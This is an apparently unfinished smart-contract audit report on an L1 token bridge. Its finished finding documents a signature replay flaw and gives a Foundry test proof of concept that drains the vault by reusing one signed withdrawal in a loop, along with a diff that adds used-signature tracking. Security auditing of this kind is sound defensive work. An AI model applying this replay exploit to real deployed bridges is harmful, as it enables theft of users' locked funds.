## High

### [H-3] The `L1BossBridge::sendToL1` is vulnerable to replay signature attacks, because it lacks a check if a signature has already been used. It means that a signature can be used an unlimited times to retrieve L1 tokens.

**Description:** The `sendToL1` function is meant to allow a central signer to approve and execute retrievals of L1 tokens following the deposit of L2 tokens. To do this, it takes the `v`, `r` and `s` values as signature of the `L1BossBridge` signer, and a `message` field that contains the abi.encoded function call to transfer L1 tokens to the user. 

However, the `sendToL1` function lacks a check if the signature has been used before. Because the signature is send over chain, it can be copied by a malicious user. This user can use these values to authorize subsequent calls to the `sendToL1` function indefinitely. 

**Impact:** As a malicious user can use a legitimate signature to withdraw L1 tokens indefinitely, it allows all assets to be drained from the vault. 

**Proof of Concept:** 
1. A malicious user makes a legit deposit to `depositTokensToL2`. 
2. This triggers the operator of the vault to sign a message for the function `withdrawTokensToL1`. 
3. The malicious user copies the resulting signature and replays the call to `withdrawTokensToL1` until all funds are drained. 

<details>
<summary> Proof of Concept</summary>

Place the following in `L1TokenBridge.t.sol`
```javascript
    function testSignatureReplay() public {
        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 100e18; 
        uint256 attackerInitialBalance = 100e18; 
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), address(attacker), attackerInitialBalance); 

        // an attacker deposits tokens to L2. 
        vm.startPrank(attacker); 
        token.approve(address(tokenBridge), type(uint256).max); 
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance); 

        //signer/operator signs withdrawal
        bytes memory message = abi.encode(
            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
        ); 
        (uint8 v, bytes32 r, bytes32 s) = 
            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message))); 
        
        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s); 
        }

        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance); 
        assertEq(token.balanceOf(address(vault)), 0); 
    }
```
</details>

**Recommended Mitigation:** Add a state variable to keep track what signatures have been used, and adding a check to disallow reuse of signatures. 

```diff 
+   mapping(bytes signature => bool hasBeenUsed) public usedSignatures; // users that can send l1 -> l2 
.
.
.
+   error L1BossBridge__ReuseSignatureNotAllowed();
.
.
.   
    function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        bytes memory signature = abi.encodePacked(r, s, v)
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

+       if (usedSignatures[signature]) {
+           revert L1BossBridge__ReuseSignatureNotAllowed();
+       }
+       usedSignatures[signature] = true; 


        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
        (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```

### [H-4] The `L1BossBridge::sendToL1` function does not check the values extracted from `message` before using them to send eth to recipient address by placing a low level `.call`. This allows a malicious user to sent large amounts of eth to their own address, or create a DoS by executing a function with immense gas cost.  

**Description:** 
TO DO - CONTINUE HERE (First flight just launched.. will finish this report when done with that one.)

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 



## Medium


## Low 


## Informational 


## Gas 
